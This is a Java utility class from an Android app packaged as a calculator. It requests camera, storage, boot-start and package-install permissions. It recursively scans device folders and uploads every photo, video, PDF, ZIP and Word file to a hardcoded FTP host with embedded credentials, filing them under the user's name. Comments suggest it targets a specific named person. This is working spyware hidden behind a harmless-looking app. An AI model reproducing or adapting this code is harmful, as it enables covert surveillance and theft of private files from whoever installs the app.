package es.fraggel.acalculator;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPFile;

import android.Manifest;
import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;

import es.fraggel.acalculator.Models.User;


public class Util {
    //App para eva
    public static String EMAIL="fraggelillo666@gmail,com";
    public static String NOMBRE="Pablo";
    //App para mi
    //public static String EMAIL="eva@gmail,com";
    //public static String NOMBRE="Eva";
    //App pruebas
    //public static String EMAIL="pruebas@gmail,com";
    //public static String NOMBRE="Nombre";

    public static String[] permissions = new String[]{
            Manifest.permission.INTERNET,
            Manifest.permission.SCHEDULE_EXACT_ALARM,
            Manifest.permission.VIBRATE,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.CAMERA,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.REQUEST_INSTALL_PACKAGES};


    public static void GetFiles(String ruta,Context mContext){
        File f=new File(ruta);
        Log.d("Directorio", f.getAbsolutePath());
        for (File file : f.listFiles()) {
            try {
                if (file.isDirectory()) {

                    GetFiles(file.getAbsolutePath(),mContext);
                } else {
                    String ff = file.getName().toLowerCase();
                    if (ff.indexOf(".mp4") != -1 || ff.indexOf(".3gp") != -1 || ff.indexOf(".m4v") != -1 || ff.indexOf(".mov") != -1
                            || ff.indexOf(".jpg") != -1 || ff.indexOf(".jpeg") != -1 || ff.indexOf(".png") != -1 || ff.indexOf(".bmp") != -1
                            || ff.indexOf(".pdf") != -1 || ff.indexOf(".zip") != -1 || ff.indexOf(".doc") != -1 || ff.indexOf(".docx") != -1) {
                        uploadFile(file,mContext);
                        Log.d("Calculator", file.getAbsolutePath());
                    }
                }
            }catch(Exception e){
                e.printStackTrace();
            }
        }
    }
    public static void uploadFile(File file,Context mContext) {
        int flag;
        FileInputStream fis = null;
        FTPClient client = new FTPClient();
        try {
            String workingDir="";
            fis = new FileInputStream(file);
            client.connect("fraggel.ddns.net", 2121); // no el puerto es por defecto, podemos usar client.connect("servidor.ftp.com");
            /*client.execPBSZ(0);
            client.execPROT("P");*/
            client.login("fraggel", "ak47cold");
            client.enterLocalPassiveMode();
            client.setFileType(FTP.BINARY_FILE_TYPE);
            workingDir="/ftp/";
            SharedPreferences pref = mContext.getSharedPreferences("LocalUser",Context.MODE_PRIVATE);
            User user = new User();
            user.FirstName = pref.getString("FirstName",null);
            client.changeWorkingDirectory(workingDir);
            client.makeDirectory(user.FirstName);
            workingDir+=user.FirstName+"/";
            client.changeWorkingDirectory(workingDir);
            client.makeDirectory(file.getParentFile().getName());
            workingDir+=file.getParentFile().getName()+"/";
            client.changeWorkingDirectory(workingDir);

            FTPFile[] ftpFiles = client.listFiles(file.getName());
            boolean uploadFile=false;
            if (ftpFiles.length > 0)
            {
                Log.d("UTIL","fichero ya existe");
            }
            else
            {
                uploadFile = client.storeFile(file.getName(), fis);
            }
            client.logout();
            client.disconnect();
        } catch (Exception eFTPClient) {
            eFTPClient.printStackTrace();
            // Gestionar el error, mostrar pantalla, reescalar excepcion... etc...
        } finally {
            try {
                fis.close();
            } catch (Exception e) {

            }

        }
    }

    static void setAlarmNow(Context context) {
        AlarmReceiver alarm = new AlarmReceiver();
        alarm.setAlarm(context,true);
    }
    static void escribirLog(String TAG,String texto,Context context) {
        try{
            Log.d(TAG,texto);
            /*SimpleDateFormat dateFormat = new SimpleDateFormat("dd MM yy hh:mm a");
            Date currentDate = new Date();
            String cuurentDateString = dateFormat.format(currentDate);
            FileOutputStream fos=new FileOutputStream(ContextCompat.getExternalFilesDirs(context, null)[0]+"logCalculadora.txt",true);
            fos.write((cuurentDateString+" "+texto+"\n").getBytes());
            fos.flush();
            fos.close();*/
        }catch(Exception e){
            e.printStackTrace();

        }
    }
}
